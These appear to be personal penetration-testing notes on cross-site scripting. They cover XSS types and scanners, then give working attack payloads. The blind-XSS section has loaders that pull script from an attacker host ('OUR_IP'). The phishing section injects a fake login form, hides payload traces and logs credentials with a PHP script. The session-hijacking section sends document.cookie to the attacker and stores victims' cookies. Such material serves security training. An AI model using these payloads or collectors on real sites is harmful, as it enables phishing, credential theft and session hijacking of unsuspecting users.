XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks. XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability.
There are three main types of XSS vulnerabilities :

| Type                             | Description                                                                                                                                                                                                                                    |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                     |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message). Disapear after page refresh.                                                     |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)   |
| `Blind XSS`                      | Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to (like contact forms, reviews, user details, support tickets, HTTP User-Agent header...). The XSS could be stored, reflected or DOM-based. |



# XSS Discovery
## Automated
- Web application scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/))
- Common open-spirce tools can assist like [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser).
## Manual
We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list).
```bash
# XSS Payloads
<script>alert(window.origin)</script>
<script>alert('XSS');</script>
<script>print()</script>
<script>alert(document.cookie)</script>
<img src="" onerror=alert(window.origin)>
<img src="" onerror=alert(document.cookie)>
```
**Note**: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in `HTTP headers` like the `Cookie or User-Agent` (i.e., when their values are displayed on the page) !!
The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code !
## Blind-XSS
In this case, we'll not see how our input is being handled. To see which field is vulnerable and what XSS payload to use, we can load a `remote JavaScript script`. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) :
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
To identify which field is vulnerable, we can put a script with the same name as the field we're injecting in
```html
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/password"></script>
<script src="http://OUR_IP/message"></script>
```
**Note:** We could avoid the email field because it often requires an email format, and the password field because it is often hashed.
Before sending the payload, we'll start a listener, and we should receive a response
```bash
sudo php -S 0.0.0.0:80
```



# XSS Attacks
## Phishing
Once we identify a working XSS payload, we can proceed to the phishing attack. We’ll display a login form on the targeted page, which will send the login info to a server we’re listening on. Here’s an example of a `HTML` login form :
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
We could put it into our payload. `OUR_IP` is the IP of the attacker, where we’ll later listen on
```bash
# Payload
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
Then, when everything is set up, we can copy the URL and the XSS payload in its parameters and send it to the victim. This depends on the XSS type.
- To encourage the victim to use the login form, we should remove every `HTML element` that could make the user think he's not obliged to log in to use the site's functions. To do so, we'll use the JavaScript `document.getElementById().remove()` function with the HTLM element's `id`. We can find the `id` of every HTLM element in the source code of the page. 
```bash
# Payload w/ removing of an HTLM element "urlform"
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```
- We can also remove any payload tracks with comments, by adding an HTML opening comment after our XSS payload :
```bash
# Remove payload tracks on site w/ comments
...PAYLOAD... <!-- 
```
- Once everything is set up correctly, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. The victim will think that they successfully logged in and will use the site's function as intended.
```php
# index.php file
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
When the `index.php` file is ready, we can start a PHP listening server
```bash
Enoxia@htb[/htb]$ mkdir /tmp/tmpserver
Enoxia@htb[/htb]$ cd /tmp/tmpserver
Enoxia@htb[/htb]$ vi index.php #at this step we wrote our index.php file
Enoxia@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started

Enoxia@htb[/htb]$ cat creds.txt
Username: test | Password: test
```
## Session Hijacking
Cookies are used to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. If we can execute `JavaScript` code on the victim's browser, we may be able to collect their cookies and gain logged-in access without knowing their credentials.
- We'll work here w/ a `Blind-XSS`. Like previously, we'll need to send a `JavaScript payload` to send us the data and a `PHP script` hosted on our server to grab the data. There are multiple JavaScript payloads we can use [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc) :
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
We can write any of those payloads in a `script.js` file hosted on our machine, and put it in a `XSS payload` that was found working in the right field (username, message...)
```html
<script src=http://OUR_IP/script.js></script>
```
We can then start the `PHP server`
```bash
Enoxia@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```
We can write a PHP script `index.php` to split every cookie found (if many) with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
```php
# index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Now we can send the XSS payload to the victim / the input field and wait for them to visit the vulnerable page. We'll then just have to use the cookie w/ our browser to access the page as the victim !